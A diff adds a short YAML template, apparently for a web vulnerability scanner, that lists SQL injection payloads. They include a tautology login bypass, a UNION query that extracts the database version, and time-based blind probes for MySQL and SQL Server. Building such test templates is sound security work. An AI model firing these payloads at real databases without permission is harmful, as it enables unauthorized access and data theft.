@@ -1,0 +1,9 @@
+name: SQL Injection Variant 1
+payloads:
+- ''''
+- ''' OR ''1''=''1'
+- ''' UNION SELECT null,version()--'
+- ''' AND SLEEP(5)--'
+- 1; WAITFOR DELAY '0:0:5'--
+severity: critical
+type: sql
